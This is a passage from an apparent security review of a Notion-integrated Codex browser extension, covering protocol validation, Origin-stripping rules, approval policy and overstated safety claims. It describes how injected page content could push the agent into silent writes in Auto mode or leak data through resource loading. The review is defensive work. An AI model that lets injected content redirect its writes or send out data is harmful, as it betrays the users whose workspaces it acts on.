**Files likely affected:** `history/schema.ts`, `history/panel.ts`, `writes/journal.ts`, `ApprovalCards.tsx`, `SettingsModal.tsx`.

**Tests required:** Repeated repository calls reuse a connection; two live connections close on deletion/version change; blocked deletion gives actionable state; tokens clear as intended; journal queries do not deserialize unrelated threads.

### M10. A saved disabled Web research preference is ignored with default model settings

**Severity:** Medium. **Confidence:** High.

**Evidence:** `sidepanel/App.tsx:34–36` applies `webSearchEnabled` only inside `if (settings.model || settings.effort || settings.serviceTier)`. `CodexClient` defaults search to enabled when the setting is absent. `SettingsModal.ResearchSection` displays the saved disabled value independently.

**Problem:** A user who changes only Web research to off can reopen the panel with the UI reporting off while the runtime requests live search.

**Why it matters:** It violates an explicit privacy/network preference and can send queries through Codex unexpectedly. This is a deterministic configuration bug, not uncertainty about model compliance.

**Reproduction / scenario:** Persist `{ webSearchEnabled: false }` without a model/effort/tier override, reopen, and inspect the effective `ThreadSettings`/configuration on the next turn.

**Root cause:** Independent settings were placed behind an unrelated model-setting guard.

**Recommended fix:** Hydrate every relevant runtime setting unconditionally before permitting a send. Keep the UI and runtime derived from the same loaded state.

**Files likely affected:** `App.tsx`, settings initialization and tests.

**Tests required:** Research-only false setting, model defaults, delayed settings load versus first send, reopening, and model changes preserving the research preference.

### M11. Native stdout decoding can corrupt Unicode inside tool arguments and answers

**Severity:** Medium. **Confidence:** High.

**Evidence:** `bridge/nox-bridge.mjs:109` appends `chunk.toString('utf8')` separately for each stdout data event before splitting lines.

**Problem:** A UTF-8 character can be split across arbitrary pipe chunks. Decoding each chunk independently introduces replacement characters even though the complete stream is valid UTF-8. JSON can remain syntactically valid while string values are changed.

**Why it matters:** Non-ASCII titles, content replacements, search strings, and model answers can be silently corrupted before Nox executes or displays them. Large-message tests made of ASCII deltas do not exercise this.

**Reproduction / scenario:** Split the UTF-8 bytes of a character such as `€` after the first byte. Concatenating the two independent `toString('utf8')` results differs from decoding the combined buffer. Place that sequence inside a JSON tool-argument string.

**Root cause:** Stream chunk boundaries are mistaken for character boundaries.

**Recommended fix:** Use `proc.stdout.setEncoding('utf8')` or Node's `StringDecoder`, preserving decoder state across chunks; frame complete decoded lines afterward. No dependency is needed.

**Files likely affected:** `bridge/nox-bridge.mjs`, `bridge/fixtures/fake-codex.mjs`, `bridge/test-bridge.mjs`.

**Tests required:** Force split two-, three-, and four-byte UTF-8 sequences in dynamic arguments, notifications, and large frames; assert exact round trip and proper EOF handling.

### M12. Protocol validation is substantially weaker than the threat model claims

**Severity:** Medium. **Confidence:** High.

**Evidence:** `codex/frame.ts`, `ChunkAssembler.push`, accepts arbitrary parts without type, count, size, total-memory, or expiry checks; it ignores `chunkEnd.chunks`. `codex/native.ts`, `dispatch`, casts/coerces rather than validates envelopes. Native Codex stdout grows without a line limit. `mcp/client.ts` buffers complete response bodies and casts result shapes. `mcp/sse.ts` splits only LF/LF and joins data lines without SSE newline semantics; `pickResponse` may select an error with an unrelated ID.

**Problem:** Malformed or large runtime inputs can retain unbounded memory, cause type errors, or leave operations waiting until timeout. Valid CRLF-delimited SSE containing multiple events fails parsing. Claims that all JSON-RPC is schema-checked and chunks are validated are inaccurate.

**Why it matters:** Provider drift and malformed tool results become panel/bridge failures. Treating a parsing failure after a write as a clean failure also compounds unknown-outcome handling. These are availability/correctness issues; an unbounded local frame is not automatically a remote RCE.

**Reproduction / scenario:** The probe completed a three-character chunk despite `chunks: 100`. Another probe failed parsing two valid CRLF-separated SSE events. Infinite/unfinished streams need not wait for model result truncation because buffering happens earlier.

**Root cause:** TypeScript declarations and final length comparison substitute for runtime boundary validation; result-budgeting happens after transport allocation.

**Recommended fix:** Validate each envelope's discriminant and required fields; reject malformed requests with a bounded correlated error. Bound line size, chunk count/aggregate size/age, and response bodies before allocation grows unchecked. Verify chunk counts. Implement the small required SSE grammar correctly or use an existing suitable parser only if justified; process until the matching response and cancel the reader when appropriate. Do not accept mismatched RPC errors as a response to the current request.

**Files likely affected:** `bridge/nox-bridge.mjs`, `lib/codex/frame.ts`, `native.ts`, `client.ts`, `lib/mcp/client.ts`, `sse.ts`, `jsonrpc.ts`.

**Tests required:** Wrong field types, unknown IDs, excessive/unterminated chunks, incorrect count, max-size boundaries, CRLF/comments/multiline SSE, long-running streams, mismatched errors, and a clean failure/reconnect without stale buffered state.

### M13. DNR fallback removes Origin for other initiators and its probe can report false success

**Severity:** Medium. **Confidence:** High for scope/probe behavior; cross-site exploitability not established.

**Evidence:** `background/dnr.ts`, `RULE_VARIANTS`, includes `request+type` and `request-only`, with no `initiatorDomains`. Rules cover the host, not only `/mcp`. `probeOriginStripped` regards every non-403 response as stripped, including 5xx. More fundamentally, it uses an unauthenticated request, while `tests/live/connect-preflight.test.ts` explicitly documents that authentication runs before the Origin check and that a valid token is needed to observe rejection. Under that ordering, a 401 cannot distinguish a stripped Origin from an unchecked one. `ensureOriginStripRule` leaves its last installed rule in place on total failure. Connection/restore code continues if status lookup fails or returns no affirmative result.

**Problem:** Nox can modify unrelated requests to the Notion MCP host while claiming the rule applies only to this extension. A backend failure can count as proof of successful header removal; failed probing can leave the broadest rule installed.

**Why it matters:** This weakens another service's Origin boundary for requests outside Nox and makes a load-bearing connection diagnostic misleading. It does not establish cookie-authenticated CSRF or token theft: those would require separate evidence about the server's authentication and CORS behavior.

**Root cause:** Availability fallbacks loosen authority boundaries, and an error-status heuristic is treated as direct header observation.

**Recommended fix:** Keep initiator and endpoint scope on every permitted rule. If Chrome cannot support it, fail with a compatibility error instead of broadening silently. Remove the rule after failed validation. Validate a documented probe response precisely; unknown responses mean unverified. Require affirmative verified status before connection if that is the documented precondition.

**Files likely affected:** `background/dnr.ts`, `ConnectionCard.tsx`, `notion-connect.ts`, DNR tests, `docs/PERMISSIONS.md`.

**Tests required:** Other extension and webpage initiators remain untouched; non-MCP paths untouched if intended; 500/429/redirect/missing status do not pass; total failure removes installed fallback; real supported Chrome versions verify the narrow rule.

### M14. Workspace-plan validation accepts malformed and fabricated evidence

**Severity:** Medium. **Confidence:** High.

**Evidence:** `architect/plan.ts:24`, `validateWorkspacePlan`, checks evidence array length but not entries, checks tool/summary but not `targetId`, and does not check evidence against reads. `PlanCards.tsx` directly dereferences every evidence entry and labels the list “Inspected … workspace items.” `PlanEngine.sameId` assumes target strings.

**Problem:** `evidence: [null]` passes validation then crashes plan rendering. A numeric target passes validation then can fail during matching. Plausible fabricated evidence is shown as inspected fact.

**Why it matters:** Malformed model output can replace the panel with its error boundary while a turn is pending. More subtly, false inspection claims make users approve a transformation on an unsupported basis. The planner's safety value depends on evidence, not merely having an array.

**Reproduction / scenario:** The probe accepted `evidence: [null]` and `targetId: 123`. An ordinary valid-looking but never-fetched evidence ID is equally accepted.

**Root cause:** Structural validation is partial and provenance is model-asserted.

**Recommended fix:** Validate every field, enum, identifier, string length, and bounded list before creating a pending plan. Resolve evidence references against actual retrieval records or label them explicitly as unverified model claims. Do not claim inspected status unless Nox can establish it. Return actionable validation errors to the model before rendering.

**Files likely affected:** `architect/plan.ts`, `tool.ts`, `plan-engine.ts`, `PlanCards.tsx`, retrieval evidence tracking.

**Tests required:** Null/primitive entries, invalid IDs and types, oversized lists/strings, missing actual retrieval, and safe UI recovery. Plan validation must not crash the panel or authorize anything on failure.

### M15. Release ZIPs omit the project's license and redistribution notices are not assembled

**Severity:** Medium for release engineering. **Confidence:** High for missing files; a complete third-party license audit was not performed.

**Evidence:** `scripts/package-release.mjs` copies only `extension/dist`, `bridge`, `extension-id.json`, and the release installer/README. The isolated packaging run confirmed the GitHub bundle has no `LICENSE`. The extension-only ZIP also receives no license/notices file from this script. Local fonts are bundled from `sidepanel/fonts/` without accompanying source/license metadata in that directory.

**Problem:** Distributed artifacts do not carry the repository's license notice. There is no explicit packaging step assembling required dependency/font notices or provenance.

**Why it matters:** Engineering teams cannot reliably assess redistribution terms from the self-contained release. The repository's own MIT text calls for preservation of its notice; omission is a concrete maintainership defect. This review does not infer a specific font-license violation without verifying the font provenance.

**Root cause:** Packaging selects executable assets and installation instructions without a corresponding license/provenance manifest.

**Recommended fix:** Include the project license in both archives and assemble applicable third-party notices for shipped JS and font assets. Record font sources/versions. Test archive contents, not only successful ZIP creation.

**Files likely affected:** `scripts/package-release.mjs`, `scripts/release/README.md`, font provenance/notice files, release checks.

**Tests required:** Archive contains LICENSE and required notice assets; no tokens, private keys, machine-specific bridge manifests, or development-only files; built version and declared artifact version agree.

### M16. One history write failure permanently disables later persistence in the same turn

**Severity:** Medium. **Confidence:** High.

**Evidence:** `history/turn.ts:16` chains every persistence task with `.then` on the previous promise without recovery. `ChatPanel.tsx` catches failures outside this queue and largely suppresses them.

**Problem:** If one streaming update fails, every later update inherits that rejection; the final answer/outcome is never attempted even if storage recovers.

**Why it matters:** A visible completed answer can reopen as an old partial or interrupted turn. The user receives no durable-history warning. This is separate from the mutation journal's commit ordering.

**Reproduction / scenario:** The probe let the user message persist, rejected one partial assistant write, then made the store healthy. The final assistant call still rejected and never reached the repository.

**Root cause:** Failure isolation exists at the caller, not in the serialized persistence queue.

**Recommended fix:** Keep serialization but recover the queue after each failed operation so later full snapshots can be saved. Surface persistence degradation, and make the final save independently attemptable. Avoid queuing an unbounded backlog of obsolete full-message snapshots during rapid streaming; coalesce superseded partials while preserving the final state.

**Files likely affected:** `history/turn.ts`, `ChatPanel.tsx`, history persistence tests.

**Tests required:** Failed partial followed by successful final; multiple transient failures; final failure visible; ordering under fast streaming; reopen matches the latest successful saved state.

## Low

### L1. A known Vitest advisory is present, but no production exploit path was established

**Severity:** Low for this repository's configured usage; upstream advisory is Moderate. **Confidence:** High.

**Evidence:** `extension/pnpm-lock.yaml`, Vitest and `@vitest/mocker` 3.2.7; `pnpm audit` reported GHSA-82fw-gwwq-j7x9 twice by dependency path. Production audit is clean. `package.json` runs `vitest run`; `vite.config.ts` does not register the public mocker plugins.

**Problem:** The development toolchain contains a known arbitrary-file-read defect in the redirect-mock path. The [maintainer advisory](https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9) describes additional server/plugin reachability requirements and a fix in 4.1.11.

**Why it matters:** This is maintenance debt that becomes relevant if development configuration exposes the affected path, not evidence of a vulnerable shipped extension.

**Root cause:** The project remains on the older affected major.

**Recommended fix:** Upgrade to a supported patched version and validate existing tests/environment integration. Do not count the two package entries as two independent production vulnerabilities.

**Files likely affected:** `extension/package.json`, lockfile, test configuration as needed.

**Tests required:** Full test/typecheck/build after upgrade; audit again; verify no mocker server is accidentally exposed through development configuration.

### L2. Support logs include user prompts and provider error bodies

**Severity:** Low. **Confidence:** High.

**Evidence:** `ChatPanel.tsx:127` logs the first 120 characters of every prompt. `lib/log.ts` captures console errors and arbitrary exception strings. MCP/OAuth errors include truncated provider response bodies. `SettingsModal.LogsSection` tells users to attach copied logs to bug reports; SUPPORT and the issue template separately tell them to sanitize.

**Problem:** Default diagnostics retain private user text and potentially sensitive provider errors while the copy workflow encourages sharing them.

**Why it matters:** A normal support workflow can publish private prompt text or workspace details. There is no automatic upload, and token leakage in a particular provider error was not demonstrated.

**Root cause:** Diagnostics store content rather than only operation metadata, with review instructions separated from the Copy button.

**Recommended fix:** Omit prompt bodies from default diagnostics; redact known credential fields and classify provider errors without retaining arbitrary bodies by default. Add a short “review for private content” notice at copy/export. Offer deliberate detailed diagnostics only when needed.

**Files likely affected:** `ChatPanel.tsx`, `lib/log.ts`, error mapping, `SettingsModal.tsx`.

**Tests required:** Sentinel prompt/token/workspace values absent from standard exported logs; useful hop/status codes retained; no automatic reporting introduced.

### L3. Browser-message validation and credential storage access are broader than necessary

**Severity:** Low as defense in depth. **Confidence:** High; no ordinary-page token-read exploit found.

**Evidence:** `shared/messages.ts`, `isNoxMessage`, accepts any `nox/` type as the narrow union. `sidepanel/store.ts` does not validate the page payload or sender. `background/index.ts` accepts metadata URL/title/icon fields without complete type/length/sender-URL validation. No `chrome.storage.local.setAccessLevel` call exists.

**Problem:** Received messages are not fully validated, and refresh tokens are available to Nox content scripts under Chrome's default local-storage access level. Ordinary page JavaScript does not thereby gain access. See the [Chrome storage reference](https://developer.chrome.com/docs/extensions/reference/api/storage).

**Why it matters:** Malformed extension-context messages can poison context or crash rendering. The storage setting unnecessarily expands the impact of a future content-script compromise.

**Root cause:** Same-extension inputs are assumed well-formed, and default storage access is accepted.

**Recommended fix:** Validate exact message discriminants and complete bounded payloads; verify sender context and use `sender.tab.url` for source identity. Restrict credential-bearing local storage to trusted extension contexts. Keep page metadata untrusted in prompts and do not treat any received page ID as a user consent grant.

**Files likely affected:** `shared/messages.ts`, `background/index.ts`, `sidepanel/store.ts`, storage initialization.

**Tests required:** Invalid/oversized metadata, wrong sender, stale navigation metadata, unknown `nox/` type, and a Chrome test that content scripts cannot read refresh tokens while the owner panel still can.

### L4. Installer and binary selection are less portable and predictable than documented

**Severity:** Low. **Confidence:** High for implementation mismatches; platform-specific behavior needs fixture verification.

**Evidence:** `bridge/resolve-codex.mjs` chooses the newest version among discovered candidates, may return the bare PATH string `codex`, and performs synchronous version probes repeatedly. `bridge/install.mjs` registers Google Chrome on Windows and Chrome/Chromium on Unix-like systems, not every Chromium browser. `install.mjs` quotes Windows arguments only when they contain whitespace; shell metacharacters in a checkout path are not covered. Generated `.sh` paths are interpolated inside shell double quotes without escaping shell expansions.

**Problem:** README suggests broad Chromium support and an absolute, predictable Codex binary; actual selection, registration, and shell escaping do not establish that contract.

**Why it matters:** A new locally installed version can silently change the experimental integration. Checkouts under special-character paths can break installation or be interpreted by a shell. This is not a demonstrated remote command-injection route: the path is controlled by local installation context.

**Root cause:** Convenience discovery and handwritten shell wrappers are presented as a supported compatibility contract.

**Recommended fix:** Document tested browser/OS/version combinations, normalize the resolved executable to an absolute path, and let users explicitly select a supported binary when needed. Cache discovery per host lifetime. Use proper shell argument/path escaping for each wrapper, or eliminate shell interpolation where feasible. Add an uninstall/update procedure for native host registration and explain that moving/deleting the checkout breaks absolute host paths.

**Files likely affected:** `install.mjs`, `bridge/install.mjs`, `resolve-codex.mjs`, release installer/README, SUPPORT.

**Tests required:** Windows paths containing spaces, `&`, `%`, and parentheses; Unix paths containing quotes, `$`, and backticks; PATH-only Codex; missing Corepack; unsupported browser; binary-version change. Do not test this by executing malicious path payloads on a real install.

### L5. CI does not exercise all release tooling and release labeling is inconsistent

**Severity:** Low. **Confidence:** High.

**Evidence:** `.github/workflows/ci.yml` push filters omit root installer and `scripts/**`; neither normal check job runs installer or evaluation-ledger tests. Packaging is tag-only, and macOS has no job. Manifest/package version is `0.1.0`; README calls it `v0.1.0-alpha`. Release documentation says manifest is the source of truth but package/client versions are separately hardcoded. Action dependencies use movable major tags.

**Problem:** CI omits existing root-tooling tests and relevant push paths, and version labels are not consistently derived.

**Why it matters:** Installer/release regressions can bypass push CI and otherwise green checks; artifact names do not communicate the alpha distinction. Successful packaging does not validate archive contents (M15).

**Root cause:** CI grew around extension/bridge implementation and did not expand with the public distribution path.

**Recommended fix:** Include installer/scripts in triggers, run the existing installer and ledger tests, and add a non-destructive archive-content verification job. Define how Chrome's numeric version maps to the alpha Git tag/ZIP name. Declare CI token permissions explicitly and pin actions to reviewed immutable revisions when adopting release hardening. Add macOS coverage before advertising it as tested.

**Files likely affected:** `.github/workflows/ci.yml`, `scripts/release-smoke.mjs`, `package-release.mjs`, release documentation.

**Tests required:** Installer-only/script-only change triggers checks; tag generates correctly labeled archives; package content assertions; claimed supported OS matrix runs the relevant tests.

### L6. Disconnect state can remain “Connected” with no usable reconnect control

**Severity:** Low. **Confidence:** High for the missing state wiring.

**Evidence:** `CodexClient.wire` fails the active turn on bridge disconnect/status events, but `codex/panel.ts` does not propagate those events to the Zustand connection state. `connectCodexAction` immediately returns when `codexStatus === 'connected'`; `BridgeCard` shows no reconnect control in that state.

**Problem:** The connection state can remain Connected after the underlying native transport has failed, hiding the reconnect control.

**Why it matters:** Resuming an existing thread does reinitialize; starting a new thread after loss does not necessarily have that recovery path. Reloading the panel becomes an undocumented workaround.

**Root cause:** Protocol lifecycle and visible connection lifecycle are separate and only initial connection updates the latter.

**Recommended fix:** Feed bridge disconnection/failure into the connection state and permit an explicit reconnect that clears/reinitializes the client. Preserve visible history and never replay a submitted turn.

**Files likely affected:** `codex/panel.ts`, `sidepanel/codex-connect.ts`, `BridgeCard.tsx`, connection state.

**Tests required:** Native port disappears after connection, crash during turn, reconnect then new chat, and resume recovery; UI state must match transport state without replay.

## Documentation / developer-experience issues

### D1. Public safety and product claims exceed the implementation

**Severity:** Medium documentation issue; underlying High issues are counted above. **Confidence:** High.

**Evidence:** The claim-by-claim table below identifies public documents and their contradicting implementation paths.

**Problem:** Public descriptions promise protections and features the code does not implement.

**Why it matters:** A skeptical reviewer can disprove these claims directly from the source. Several imply guarantees that users need when choosing Auto or approving writes.

| Claim and location | Actual implementation / correction |
|---|---|
| README: workspace plans approved “even in Auto mode”; THREAT-MODEL: moves/schema/out-of-context/bulk always ask | Auto validates its own plan and bypasses those action checks (H2). Say exactly who approves and which effects require human consent. |
| THREAT-MODEL: injected requests refused by `injected_request` guard; `application.md`: executor rejects smuggled requests | `stripReservedArgs` discards that field; no refusal detector exists. The production provenance signal usually asks for approval, while Auto structural calls bypass it. Describe prompt rules and deterministic gates separately. |
| README: page instructions “never executed”; THREAT-MODEL: injection can influence speech but cannot silently write | Prompt delimiters do not establish model obedience; H2 permits silent structural writes and H1 supplies a non-write exfiltration sink. Remove absolutes. |
| README/PRIVACY/PERMISSIONS/store listing: outbound data goes only to Notion MCP and the local bridge | Codex processes prompts via the user's provider; enabled native web research retrieves external sources; uploads use ticket URLs; rendered media loads externally (H1). Explicitly distinguish Nox-operated infrastructure, extension egress, and provider/research processing. |
| README: image input through Codex | `AgentLoop` sends one text input; attachments are metadata/upload inputs, and instructions explicitly say PDF/image analysis unavailable. Remove the image-analysis implication. |
| README: property undo supports five safe types | `buildInverse('properties')` always returns not-undoable; the safe-type helper is unused. State that property undo is unavailable. |
| README: bulk/AI autofill with progress pinned and one-click undo; smoke: quota estimate and >25-row confirmation | No dedicated autofill orchestration/estimate is established; `rowCount` is never supplied by production `WriteGate`; ordinary tool streaming is not this feature. Scope the claim to tested tool calls. |
| README: creations marked not-undoable and deep-linked | Journal creation entries do not populate `targetPageId`; activity UI does not guarantee a returned-object deep link or display every not-undoable reason. A model-provided answer link is not a UI guarantee. |
| THREAT-MODEL: refresh rotation atomic, cannot brick auth | Durable-first writes reduce one window; server rotation before local save, storage failure, and sign-out races remain. State the residual reauthentication requirement. |
| THREAT-MODEL: non-writable temporary cwd and resolved absolute binary | `cwd: tmpdir()` is writable; PATH candidate can be bare `codex`. Read-only sandbox is configured by the extension, not an intrinsic property of the temp directory or transparent bridge. |
| THREAT-MODEL: all JSON-RPC schema-checked; chunk reassembly validated | Runtime validation is partial and chunk count is ignored (M12). Name the actual checks. |
| PERMISSIONS: no `.notion.site` host; tabs work “without content scripts or DOM scraping”; storage supplies owner lock/cache | Manifest includes `.notion.site`; content script scrapes title/icon; owner uses Web Locks; old IndexedDB caches were removed. Update the permission table from the manifest and actual APIs. |
| PERMISSIONS/application: DNR only this extension/endpoint; failed verification stops connection | Broader fallbacks and missing-status continuation exist (M13). |
| Store listing: history stays in browser, user content nowhere else | Codex history and remote provider processing must be disclosed there too; PRIVACY and README are more accurate about Codex storage. |

**Root cause:** Product copy, spike conclusions, and evolving implementations were not reconciled after changes. Documentation repeats the same guarantees in several places.

**Recommended fix:** Make `docs/application.md` the precise implementation reference and shorten duplicated safety claims elsewhere into accurate summaries with links. Describe safeguards as bounded checks, not injection-proofing or atomicity. Keep a compact “implemented / tested live / unsupported” feature table. Align privacy copy across README, PRIVACY, and store listing. No corporate filler is needed.

**Files likely affected:** `README.md`, `PRIVACY.md`, `docs/application.md`, `THREAT-MODEL.md`, `PERMISSIONS.md`, `smoke.md`, `store-listing.md`, release notes.

**Tests required:** Review each claim against code and actual release evidence; automated checks can compare manifest permissions and archive contents, but cannot prove natural-language security claims. Live evidence must identify versions, account capability surface, and scratch results.

### D2. AGENTS requires too much context for trivial tasks, while CONTRIBUTING contains stale absolutes

**Severity:** Low developer-experience issue. **Confidence:** High.

**Evidence:** `AGENTS.md` starts “Read `docs/application.md` before doing anything else.” The current architecture file is roughly 330 lines and about 4,900 tokens in this review's read output. `CONTRIBUTING.md` says modules under `src/lib/` never touch `chrome.*`, although `settings.ts`, `chrome-storage.ts`, `history/panel.ts`, `notion/panel.ts`, and `codex/panel.ts` do. It prescribes historical `E<epic>.<n>` commit subjects. Source comments cite removed `RESEARCH`, `MVP`, and `docs/plans/E*.md` materials. `CLAUDE.md` is empty.

**Problem:** Architecture loading is useful for cross-boundary work but mandatory even for a typo, icon, or isolated test correction. Stale absolutes make agents choose between repository instructions and normal existing patterns.

**Why it matters:** Extra reading consumes context without proportionate safety value; ambiguous instruction conflicts cause unnecessary clarification and cleanup proposals. This adversarial whole-project task did justify reading the architecture first.

**Root cause:** Instructions retained an early-project onboarding workflow rather than progressively disclosing task-specific knowledge.

**Recommended fix:** Replace the first line with a relevance rule: read the architecture before changing runtime flows, trust boundaries, persistence, or cross-component behavior; for local changes read the relevant code/tests first. Keep the current concise boundary bullets and verification commands. Explain the actual side-effect assembly exception in CONTRIBUTING. Remove obsolete commit conventions unless still enforced. Link source comments to current files/sections instead of missing documents. Do not expand AGENTS into a manual, duplicate the architecture there, or add approval requirements for ordinary reversible work.

**Files likely affected:** `AGENTS.md`, `CONTRIBUTING.md`, stale source comments, optionally remove empty `CLAUDE.md`.

**Tests required:** No runtime tests. Check linked paths and run a small agent dry review of a typo task versus a write-gate task: only the latter should require full boundary context. Existing security constraints and relevant checks must remain discoverable.

### D3. Test names and smoke checkboxes sometimes imply guarantees they do not test

**Severity:** Medium verification/documentation issue. **Confidence:** High.

**Evidence:** `tests/scheduler.test.ts` shared-budget test does not measure shared rate; `tests/writes/gate.test.ts` uses an always-allow plan authorizer by default and explicitly endorses Auto untrusted bypass; viewer tests cover separate controls but not restored timeline undo. Plan tests check different IDs, not different effects or reuse. Live workspace tests inspect identity/tool lists, with separate OAuth/Origin preflight tests; they do not verify workspace mutation contracts. `docs/answer-quality-verification.md` explicitly retains pending scratch mutation/model-isolation acceptance.

**Problem:** Some tests validate policy wording or substitute permissive components for the boundaries their names suggest they cover.

**Why it matters:** Green tests can give false confidence in the exact boundaries likely to be attacked. Text assertions that instructions contain safety language do not prove safe runtime behavior. Existing evidence does not justify signing off a live release's write/undo guarantees.

**Root cause:** Component behavior and textual policy are tested more often than the full assembled authorization/data path and crash boundaries.

**Recommended fix:** Prioritize cross-component adversarial cases named in the findings. Keep fast component tests, but add a small deterministic fixture suite using production assembly and real response shapes. Record model/version-specific native surface checks and disposable workspace mutation/undo results separately. Change smoke items that describe nonexistent features. Avoid a large duplicate test framework.

**Files likely affected:** Existing approval, plan, scheduler, viewer, history, bridge, and live tests; `docs/smoke.md`, `answer-quality-verification.md`.

**Tests required:** Each High fix must have a regression that fails on this reviewed revision. A release gate should reject missing live evidence rather than counting skipped tests as passed. Do not require a statistical answer-quality claim merely to show an honest alpha demo, but do require verification of the safety features being demonstrated.

## Planning and approval: recommended coherent policy

This section consolidates H2 and M1/M2; it is a design recommendation, not an implemented change.

1. **Separate four questions:** Is the operation available? Does it mutate or disclose data? Is its effect already authorized? Does its overall transformation merit a plan? A tool can be a mutation without needing a plan, and a validated plan can exist without being authorized.
2. **Reads do not require workspace plans or action approvals.** Search/fetch/continuation are evidence gathering. Preserve capability, time, request, and result-size bounds. An unavailable read should produce an availability error, not a structural-plan demand. Reads can still disclose information through external research, which is a separate egress policy.
3. **Plan for material transformations.** The trigger should consider destructive schema effects, difficult reversal, affected objects and destinations, coordination, and aggregate scope. A view rename is materially different from removing a data-source property; one move is different from reorganizing many pages. Avoid thresholds that count routine reads or arbitrary tool calls as “architecture.”
4. **Use action approval when it supplies all necessary comprehension.** A small isolated edit can show its target and actual change directly. Auto can execute genuinely low-risk work within a defined authorized context. Auto is not blanket authority to change objects discovered in untrusted content.
5. **Compile an approved plan into bounded operations.** Show actual targets/effects and meaningful consequences; bind evidence to retrievals; record approval with workspace/account, turn, and operation identity. Match all material arguments, not any incidental ID. Support result-bound IDs for approved creations. Track remaining counts and consumed operations. This can be a small data structure; it does not need a general-purpose policy engine.
6. **Inherit consent only inside that scope.** In Ask mode, explicitly approved covered actions should not prompt again. New targets, changed destinations/effects, increased risk/count, upload or other security-boundary consent, and unknown outcomes require a new review. Read/guard/scheduler/journal checks still run even when consent is inherited.
7. **Do not repair friction using approve-all or Auto's current bypass.** `ApprovalEngine.approveAllUntilTurnEnd` authorizes future requests, not merely visible cards. Its label does say “this turn,” so this is not a hidden cross-turn grant; nevertheless it can waive future out-of-context/escalation reasons. Prefer approval of a known batch/scope. If broad turn authorization remains, name that breadth explicitly and keep separate-boundary escalations outside it.
8. **Record completion honestly.** A rejected plan is not a successful transformation. A write with an unknown remote outcome needs reconciliation. Preview, authorization, execution, verification, and recovery must refer to the same operation identities.

Suggested acceptance matrix:

| Scenario | Plan? | Consent behavior |
|---|---|---|
| Search and fetch a few related pages | No | Execute under read/capability limits |
| One bounded page/property edit | Usually no | Ask: one action card; Auto: defined low-risk policy |
| One cosmetic view change | Usually no | Tool-aware action policy, not automatic structural ceremony |
| Destructive schema/broad page reorganization | Yes | Explicit transformation scope; Auto must not self-grant escalation authority |
| Ten covered actions after explicit plan approval | Already approved | No repeated ordinary action cards; all execution safeguards remain |
| Same tool/target but materially different effect | New scope review | Existing summary/ID match is insufficient |
| One allowed target plus an extra target in a batch | New scope review | Do not accept “any relevant ID matches” |
| Selected file, no upload request | No workspace plan needed | Selection alone does not authorize external upload |
| Cancel/timeout during write | N/A | Stop further work, retain unknown outcome, reconcile |

## Things investigated that are actually OK

- **Architectural separation is real at the normal tool path.** Dynamic Notion requests return to the extension; the standard path reaches `ToolExecutor` and `WriteGate`. The upload and undo exceptions are specifically identified, not a claim that all gating is absent.
- **No OpenAI credential was found in extension source.** The bridge launches local Codex using its own login. `publicConfig` uses an allowlist so provider credentials/MCP headers from `config/read` do not cross into Chrome; the bridge test explicitly verifies this. This does not establish that arbitrary future Codex errors or methods can never contain secrets.
- **Native messaging does not expose a localhost server.** Production uses framed stdin/stdout and an exact extension origin in the installed host manifest. The public manifest key pins identity; it is not a leaked private key. Same-user malware and a user deliberately loading a modified unpacked extension are outside the normal webpage threat boundary.
- **OAuth uses PKCE and random state.** The production consent path validates state and optional issuer and registers a public client without a secret. Access/session versus durable refresh storage is implemented. These are meaningful controls, subject to M8 and metadata/runtime validation limitations.
- **Ordinary Notion page JavaScript is not automatically extension code.** The content script runs in Chrome's isolated environment; it does not relay arbitrary `window.postMessage` commands to native messaging. DOM metadata is wrapped as untrusted context. Missing defensive validation is not proof of direct webpage access to the token store.
- **Ask is the default.** `store.ts` starts in Ask. Straightforward action rejection stops that pending action. The issue is incomplete preview and inherited authorization, not a missing default approval mode.
- **Known read tools really bypass workspace planning.** The reported friction should not be diagnosed as “more than N reads requires a plan”; that rule does not exist here.
- **Untrusted delimiters cannot simply be closed by copying the same delimiters into content.** `wrapUntrusted` escapes both marker strings. This is useful prompt hygiene, not a semantic injection detector.
- **The renderer has useful XSS controls.** DOMPurify removes script/event-handler payloads and unsafe executable URL schemes in existing tests; valid Notion UUID links become HTTPS links and anchors receive `noopener noreferrer`. The High issue is passive resource loading, not demonstrated JavaScript execution.
- **Turn IDs and cancellation handling have meaningful tests.** Requests/events are matched to active thread/turn, early events are buffered until acknowledgement, late tool responses are suppressed, and failed interruption disconnects after five seconds. Interrupted/failed text is preserved. A disconnected submitted turn is not automatically replayed. Aborting an HTTP request still cannot roll back a server commit.
- **Codex built-in approvalPolicy `never` is not the Notion write policy.** The extension separately handles dynamic-tool writes. Restricted features/MCP inventory are checked before running. The read-only sandbox alone is not a complete tool-isolation guarantee, and current docs already acknowledge model-specific live checks remain outstanding.
- **Conservative unsupported undo is preferable to invented inverses.** Creations, property changes, moves, schemas, and views currently return not-undoable; content undo checks expected post-write hash. The README's property-undo claim is wrong, but the implementation does not falsely implement an unsafe property inverse. Full content round-trip completeness remains a live contract check; regex-based rich-page detection is not proof of losslessness for every block.
- **Owner acquisition itself uses a real Web Lock.** Unsupported browsers become viewers instead of using a racy storage lock. H4 is an execution entrance escaping that discipline, not a flaw in Web Locks.
- **Capability fail-open is not a Notion entitlement bypass by itself.** The capability map is an availability aid, and Notion must still enforce actual account permissions. Unknown capability entries should not be described as positively verified availability; local execution scope still needs enforcement.
- **Production build and dependencies are not obviously carrying a known Critical/High advisory.** The production audit was clean, the bridge is dependency-free, the lockfile is used by CI/installer, and the development token-import UI is gated by `import.meta.env.DEV`. An audit clean result is time-bound and does not prove dependency safety.
- **SECURITY.md supplies a specific private reporting route and support policy.** The bug template also points users away from public disclosure. Whether GitHub private vulnerability reporting is actually enabled was not verified through repository administration; verify before advertising the route as operational.

### Additional verification limits worth preserving

The exact current Notion fetch/update/upload schemas are not captured in enough live mutation fixtures to prove all normalization and inverse behavior. The spike describes extracting `<content>`, whereas production snapshot helpers concatenate text parts. Content-update undo is disabled by post-write attribution unless the recognized replacement shape matches; it should not be marketed as general edit undo. Verify representative real plain/rich/partial pages in a scratch workspace before expanding guarantees.

The Node OAuth spike is not the extension authentication path. It binds its callback with `srv.listen(PORT)` without an explicit loopback address, writes token JSON directly without restrictive mode/atomic replacement, and can be terminated by an invalid callback. PKCE/state protect code acceptance; the local helper is still worth tightening or removing if retained for public contributors. Do not cite it as production OAuth behavior or run it with a valuable workspace merely to demonstrate installation.

## External-review readiness

### Must fix before showing an engineering team

- Close H1's automatic resource egress, and align privacy wording with actual Codex/web/upload processing.
